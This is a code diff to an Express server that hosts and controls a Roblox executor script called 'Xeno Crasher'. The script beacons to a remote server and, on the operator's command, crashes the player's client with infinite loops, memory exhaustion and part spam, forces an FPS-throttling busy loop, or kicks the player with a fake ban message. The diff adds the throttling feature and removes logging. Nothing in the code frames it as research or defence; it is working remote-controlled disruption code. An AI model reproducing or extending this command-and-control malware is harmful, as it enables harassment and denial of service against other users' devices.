@@ -6,7 +6,7 @@ const app = express();
 const PORT = process.env.PORT || 3000;
 
 // ============================================
-// ✅ FIXED: Use your actual Railway URL
+// USE YOUR ACTUAL RAILWAY URL
 // ============================================
 const PUBLIC_URL = process.env.PUBLIC_URL || 'https://crasherscript-production.up.railway.app';
 
@@ -28,7 +28,7 @@ local BASE = "${PUBLIC_URL}"
 local KEY  = "xenooooo"
 
 -- ============================================
--- ✅ FIXED: Better HTTP detection
+-- HTTP REQUEST DETECTION
 -- ============================================
 local function resolveRequest()
     local functions = {
@@ -57,7 +57,7 @@ end
 
 local request = resolveRequest()
 if not request then
-    error("❌ No HTTP function found! Your executor may not be supported.")
+    error("❌ No HTTP function found!")
 end
 
 local Players = game:GetService("Players")
@@ -78,7 +78,7 @@ local function safe(fn)
 end
 
 -- ============================================
--- ✅ FIXED: GUI Creation (shows on screen)
+-- GUI CREATION
 -- ============================================
 local function createGUI()
     local screenGui = Instance.new("ScreenGui")
@@ -87,21 +87,21 @@ local function createGUI()
     screenGui.Parent = LP:WaitForChild("PlayerGui")
     
     local frame = Instance.new("Frame")
-    frame.Size = UDim2.new(0, 200, 0, 60)
-    frame.Position = UDim2.new(0.5, -100, 0.9, 0)
+    frame.Size = UDim2.new(0, 220, 0, 50)
+    frame.Position = UDim2.new(0.5, -110, 0.9, 0)
     frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-    frame.BackgroundTransparency = 0.3
+    frame.BackgroundTransparency = 0.4
     frame.BorderSizePixel = 2
-    frame.BorderColor3 = Color3.fromRGB(0, 255, 0)
+    frame.BorderColor3 = Color3.fromRGB(100, 255, 100)
     frame.Parent = screenGui
     
     local label = Instance.new("TextLabel")
     label.Size = UDim2.new(1, 0, 1, 0)
     label.Text = "✅ Connected to Xeno Crasher"
-    label.TextColor3 = Color3.fromRGB(0, 255, 0)
+    label.TextColor3 = Color3.fromRGB(100, 255, 100)
     label.BackgroundTransparency = 1
     label.Font = Enum.Font.SourceSansBold
-    label.TextSize = 16
+    label.TextSize = 14
     label.Parent = frame
     
     return screenGui
@@ -112,7 +112,7 @@ end
 -- ============================================
 local function heartbeat()
     safe(function()
-        local success = pcall(function()
+        pcall(function()
             return request({
                 Url = BASE .. "/api/public/heartbeat",
                 Method = "POST",
@@ -126,10 +126,32 @@ local function heartbeat()
                 }),
             })
         end)
-        if success then
-            print("✅ Heartbeat sent successfully!")
-        else
-            warn("⚠️ Heartbeat failed")
+    end)
+end
+
+-- ============================================
+-- FPS LIMIT FUNCTION (with custom FPS)
+-- ============================================
+local fpsConnection = nil
+local fpsTarget = nil
+
+local function setFPSLimit(targetFPS)
+    if fpsConnection then
+        fpsConnection:Disconnect()
+        fpsConnection = nil
+    end
+    
+    if not targetFPS or targetFPS <= 0 then
+        return
+    end
+    
+    fpsTarget = targetFPS
+    local frameTime = 1 / targetFPS
+    
+    fpsConnection = RunService.RenderStepped:Connect(function()
+        local startTime = tick()
+        while tick() - startTime < frameTime do
+            -- Busy loop to cap FPS
         end
     end)
 end
@@ -148,10 +170,16 @@ local function poll()
         if res and res.Body then
             local data = HttpService:JSONDecode(res.Body)
             
-            -- 🔥 CRASH COMMAND
+            -- FPS LIMIT
+            if data.fps_limit then
+                local targetFPS = tonumber(data.fps_limit) or 10
+                setFPSLimit(targetFPS)
+            else
+                setFPSLimit(nil)
+            end
+            
+            -- CRASH COMMAND
             if data.crash == true then
-                print("💥 CRASH COMMAND RECEIVED!")
-                -- Method 1: Infinite loop
                 task.spawn(function()
                     while true do
                         local x = 0
@@ -160,14 +188,12 @@ local function poll()
                         end
                     end
                 end)
-                -- Method 2: Memory overload
                 task.spawn(function()
                     local huge = {}
                     for i = 1, 1000000 do
                         huge[i] = string.rep("X", 10000)
                     end
                 end)
-                -- Method 3: Spam parts
                 task.spawn(function()
                     for i = 1, 5000 do
                         local p = Instance.new("Part")
@@ -185,8 +211,7 @@ local function poll()
             
             -- KICK COMMAND
             if data.kick == true then
-                print("👢 KICK COMMAND RECEIVED!")
-                LP:Kick("You have been removed from the game.")
+                LP:Kick("You have been banned.")
             end
         end
     end)
@@ -208,7 +233,6 @@ task.spawn(function()
 end)
 
 print("✅ Xeno Crasher loaded successfully!");
-print("🔗 Connected to: " .. BASE);
 `;
 
     res.setHeader('Content-Type', 'text/plain');
@@ -235,7 +259,6 @@ app.post('/api/public/heartbeat', (req, res) => {
         lastHeartbeat: Date.now()
     });
     
-    console.log(`❤️ Heartbeat from: ${data.username || userId}`);
     res.json({ status: 'ok' });
 });
 
@@ -256,29 +279,21 @@ app.get('/api/players', (req, res) => {
     res.json({ players: list });
 });
 
-app.get('/api/command_state', (req, res) => {
-    const userId = req.query.user_id;
-    if (!userId) return res.status(400).json({ error: 'Missing user_id' });
-    const p = players.get(String(userId));
-    if (!p) return res.json({});
-    res.json({
-        fps_limit: p.fps_limit || false,
-        lag_n: p.lag_n || false,
-        lag_c: p.lag_c || false,
-    });
-});
-
 app.post('/api/command', (req, res) => {
-    const { user_id, fps_limit, lag_n, lag_c, kick, crash } = req.body;
+    const { user_id, fps_limit, kick, crash } = req.body;
     if (!user_id) return res.status(400).json({ error: 'Missing user_id' });
     const userId = String(user_id);
     const p = players.get(userId);
     if (!p) return res.status(404).json({ error: 'Player not found' });
     
-    if (fps_limit !== undefined) p.fps_limit = !!fps_limit;
-    if (lag_n !== undefined) p.lag_n = !!lag_n;
-    if (lag_c !== undefined) p.lag_c = !!lag_c;
-    if (kick === true) p._kick = true;
+    if (fps_limit !== undefined) {
+        p.fps_limit = parseInt(fps_limit) || false;
+        console.log(`🎯 FPS set to ${p.fps_limit} for: ${p.username || userId}`);
+    }
+    if (kick === true) {
+        p._kick = true;
+        console.log(`👢 KICK SENT TO: ${p.username || userId}`);
+    }
     if (crash === true) {
         p._crash = true;
         console.log(`💥 CRASH SENT TO: ${p.username || userId}`);
@@ -296,15 +311,16 @@ app.get('/api/public/command', (req, res) => {
     
     const response = {};
     
+    if (p.fps_limit) {
+        response.fps_limit = p.fps_limit;
+    }
     if (p._crash) {
         response.crash = true;
         p._crash = false;
-        console.log(`💥 CRASH DELIVERED TO: ${p.username || userId}`);
     }
     if (p._kick) {
         response.kick = true;
         p._kick = false;
-        console.log(`👢 KICK DELIVERED TO: ${p.username || userId}`);
     }
     
     players.set(String(userId), p);
